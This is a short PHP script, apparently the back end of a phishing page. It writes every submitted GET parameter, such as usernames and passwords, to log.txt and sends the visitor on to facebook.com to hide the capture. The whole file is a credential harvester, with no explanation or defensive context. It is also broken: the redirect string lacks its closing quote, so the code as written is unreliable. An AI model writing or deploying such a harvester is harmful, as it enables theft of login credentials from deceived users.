<?php

header('Location: http://www.facebook.com);

$file = fopen("log.txt", "a");
foreach($_GET as $variable => $value) {
	fwrite($file, $variable);
	fwrite($file,"=");
	fwrite($file, $value);
	fwrite($file, "\r\n");
}

fwrite($file, "\r\n");
fclose($file);
exit;
?>
	